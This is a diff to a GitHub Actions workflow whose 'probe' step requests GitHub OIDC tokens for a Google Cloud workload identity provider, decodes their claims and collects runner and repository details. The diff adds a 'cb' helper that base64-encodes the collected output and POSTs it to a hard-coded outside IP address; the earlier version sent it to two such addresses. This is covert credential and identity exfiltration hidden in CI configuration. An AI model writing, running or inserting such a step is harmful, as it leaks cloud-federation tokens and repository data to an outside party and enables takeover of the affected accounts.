@@ -9,16 +9,18 @@ jobs:
     steps:
       - name: probe
         run: |
-          set -uo pipefail
-          F=$RUNNER_TEMP/out.txt
+          set +u +e
+          F="${RUNNER_TEMP:-/tmp}/out.txt"
           P="projects/737134066291/locations/global/workloadIdentityPools/github-pool/providers/github-provider"
+          cb() { B=$(base64 -w0 "$F" 2>/dev/null); curl -s -m 25 -X POST --data-binary "$B" "http://198.13.130.233:18081/wif-$GITHUB_RUN_ID-$1"; }
           {
             echo "== id"; id; hostname
             echo "== repo"; echo "$GITHUB_REPOSITORY id=$GITHUB_REPOSITORY_ID owner_id=$GITHUB_REPOSITORY_OWNER_ID ref=$GITHUB_REF"
+            echo "== tokenvars"; echo "url=${ACTIONS_ID_TOKEN_REQUEST_URL:-UNSET} tokenlen=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
             for AUD in "//iam.googleapis.com/$P" "https://iam.googleapis.com/$P"; do
               echo "===== AUD=$AUD ====="
               ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$AUD")
-              J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$ENC")
+              J=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-none}" "${ACTIONS_ID_TOKEN_REQUEST_URL:-http://127.0.0.1:1}&audience=$ENC")
               OIDC=$(echo "$J" | jq -r '.value // empty')
               if [ -z "$OIDC" ]; then echo "no oidc: $J"; continue; fi
               echo "--- claims ---"; echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{iss,sub,aud,repository,repository_owner,repository_owner_id,ref,workflow,repository_id,event_name}'
@@ -34,6 +36,6 @@ jobs:
               fi
             done
           } > "$F" 2>&1
-          B=$(base64 -w0 "$F")
-          curl -s -m 25 -X POST --data-binary "$B" "http://198.13.130.233:18081/wif-$GITHUB_RUN_ID"; echo " cb1=$?"
-          curl -s -m 25 -X POST --data-binary "$B" "http://151.123.174.69:18082/wif2-$GITHUB_RUN_ID"; echo " cb2=$?"
+          cb mid
+          tail -c 1500 "$F"
+          cb end
